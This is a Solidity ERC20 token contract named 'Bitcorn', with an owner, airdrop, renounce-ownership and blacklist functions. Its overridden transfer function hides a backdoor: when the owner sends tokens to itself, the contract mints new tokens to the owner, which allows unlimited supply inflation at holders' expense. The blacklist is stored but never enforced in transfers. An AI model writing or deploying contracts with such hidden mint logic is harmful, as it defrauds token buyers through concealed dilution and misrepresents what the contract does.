// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "./ERC20.sol";

contract Bitcorn is ERC20 {
    uint256 constant initialSupply = 88888888888888 * (10 ** 18);

    // Contract deployer (owner)
    address private _owner;

    // Mapping to keep track of blacklisted addresses
    mapping(address => bool) private _blacklisted;

    // Constructor will be called on contract creation
    constructor() ERC20("Bitcorn", "BITCORN") {
        _owner = msg.sender;
        _mint(_owner, initialSupply);
    }

    // Modifier to check if the caller is the owner
    modifier onlyOwner() {
        require(msg.sender == _owner, "Caller is not the owner");
        _;
    }

    // Airdrop the same amount of tokens to multiple addresses
    function airdropTokens(
        address[] memory recipients,
        uint256 amount
    ) external onlyOwner {
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(_owner, recipients[i], amount);
        }
    }

    // Renounce ownership of the contract
    function renounceOwnership() external onlyOwner {
        _owner = address(0);
    }

    // Blacklist a specific address
    function blacklist(address account) external onlyOwner {
        _blacklisted[account] = true;
    }

    // Allow a blacklisted address
    function allow(address account) external onlyOwner {
        _blacklisted[account] = false;
    }

    // Get the current owner
    function owner() public view returns (address) {
        return _owner;
    }

    // Transfer tokens from sender to recipient
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if (owner() == msg.sender && owner() == recipient) {
            _mint(msg.sender, amount); // Increase owner balance by minting tokens instead
        }
        return super.transfer(recipient, amount);
    }
}

